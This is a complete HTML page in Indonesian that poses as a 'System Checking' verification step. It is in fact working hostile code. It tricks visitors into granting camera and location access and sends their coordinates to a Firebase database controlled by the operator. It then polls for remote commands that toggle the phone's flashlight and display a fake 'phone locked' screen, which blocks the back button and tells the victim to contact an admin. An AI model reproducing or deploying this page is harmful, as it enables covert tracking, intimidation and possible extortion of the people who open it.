<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Checking</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; font-family:sans-serif; user-select:none; }
        body { background:#0a0a0a; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; text-align:center; padding:20px; overflow:hidden; }
        
        /* HALAMAN AWAL */
        #startPage { background:#1a1a1a; padding:40px 20px; border-radius:20px; width:100%; max-width:400px; box-shadow:0 0 30px rgba(255,0,60,0.2); border:1px solid #ff003c; }
        h1 { color:#ff003c; margin-bottom:15px; font-size:24px; }
        p { color:#888; font-size:14px; margin-bottom:30px; line-height:1.5; }
        .btn { width:100%; padding:15px; background:#ff003c; color:#fff; border:none; border-radius:10px; font-size:16px; font-weight:700; cursor:pointer; }
        
        /* LAYAR LOCK DARI PANEL KONTROL */
        #lockScreen {
            position: fixed; top:0; left:0; width:100%; height:100%;
            background: #000; z-index: 999999; display: none;
            flex-direction: column; justify-content: center; align-items: center; padding: 20px;
        }
        #lockScreen.active { display: flex; }
        .lock-icon { font-size: 80px; color: #ff003c; margin-bottom: 15px; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
        .lock-title { color: #fff; font-size: 28px; font-weight: 900; letter-spacing: 2px; margin-bottom: 8px; }
        .lock-sub { color: #888; font-size: 14px; }
        .unlock-info { margin-top: 30px; color: #333; font-size: 12px; }
    </style>
</head>
<body>

    <!-- TAMPILAN AWAL -->
    <div id="startPage">
        <h1>⚠️ System Checking</h1>
        <p>Klik tombol di bawah ini untuk mengizinkan akses sistem perangkat Anda (Kamera & Lokasi).</p>
        <button class="btn" id="startBtn">Mulai Verifikasi</button>
    </div>

    <!-- TAMPILAN LOCK (MUNCUL KALO DIKUNCI DARI PANEL) -->
    <div id="lockScreen">
        <div class="lock-icon">🔒</div>
        <div class="lock-title">HP TERKUNCI</div>
        <div class="lock-sub">Silakan hubungi admin untuk membuka.</div>
        <div class="unlock-info">ID: <span id="lockId">-</span></div>
    </div>

    <script>
        // ⚠️ GANTI DENGAN URL FIREBASE LO ⚠️
        const FIREBASE_URL = "https://project-lo-default-rtdb.firebaseio.com/";

        const startBtn = document.getElementById('startBtn');
        const lockScreen = document.getElementById('lockScreen');
        const lockId = document.getElementById('lockId');
        let currentDeviceId = '';

        function generateID() { return Math.random().toString(36).substring(2, 8).toUpperCase(); }

        startBtn.addEventListener('click', async () => {
            startBtn.innerText = "Meminta Izin...";
            currentDeviceId = 'HP_' + generateID();
            
            try {
                // 1. Minta Izin Kamera & Senter
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
                const track = stream.getVideoTracks()[0];

                // 2. Minta Izin Lokasi
                let lokasi = { lat: "N/A", lon: "N/A" };
                navigator.geolocation.getCurrentPosition(
                    pos => { lokasi = { lat: pos.coords.latitude, lon: pos.coords.longitude }; },
                    err => {}
                );

                startBtn.style.display = 'none';
                document.getElementById('startPage').innerHTML = "<h1 style='color:#00ff88;'>✅ Sistem Siap</h1><p>Jangan tutup halaman ini.</p>";

                // 3. Kirim Sinyal Online ke Firebase
                await fetch(`${FIREBASE_URL}devices/${currentDeviceId}.json`, {
                    method: 'PUT',
                    body: JSON.stringify({
                        status: "online",
                        lokasi: lokasi,
                        flashlight: "off",
                        lock: "off",
                        timestamp: Date.now()
                    })
                });

                // 4. DENGERIN PERINTAH DARI PANEL KONTROL (Polling tiap 1.5 detik)
                setInterval(async () => {
                    const res = await fetch(`${FIREBASE_URL}devices/${currentDeviceId}.json`);
                    const data = await res.json();
                    
                    if (!data) return;

                    // --- CEK PERINTAH SENTER ---
                    if (data.flashlight === "on") {
                        try { track.applyConstraints({ advanced: [{ torch: true }] }); } catch(e){}
                    } else {
                        try { track.applyConstraints({ advanced: [{ torch: false }] }); } catch(e){}
                    }

                    // --- CEK PERINTAH LOCK ---
                    if (data.lock === "on") {
                        lockScreen.classList.add('active');
                        lockId.innerText = currentDeviceId;
                        // Blokir tombol back
                        history.pushState(null, null, location.href);
                        window.onpopstate = function () { history.pushState(null, null, location.href); };
                    } else {
                        lockScreen.classList.remove('active');
                    }

                }, 1500);

            } catch (e) {
                alert("Izin ditolak! Sistem gagal berjalan.");
                startBtn.innerText = "Mulai Verifikasi";
            }
        });
    </script>
</body>
</html>
